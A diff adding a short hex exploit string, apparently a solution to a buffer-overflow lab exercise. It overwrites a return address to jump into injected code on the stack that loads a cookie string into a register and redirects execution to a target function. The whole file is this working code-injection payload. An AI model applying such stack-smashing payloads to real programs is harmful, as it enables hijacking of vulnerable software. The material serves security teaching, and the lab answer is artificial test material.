@@ -1,0 +1,9 @@
+48 c7 c7 b0 dc 61 55 c3 # mov cookie to rdi and ret
+00 00 00 00 00 00 00 00 # jmp
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+78 dc 61 55 00 00 00 00 # return to inj code (buf at line 1)
+fa 18 40 00 00 00 00 00 # (on return) jmp destination
+35 39 62 39 39 37 66 61 # <- beg of cookie string
+00
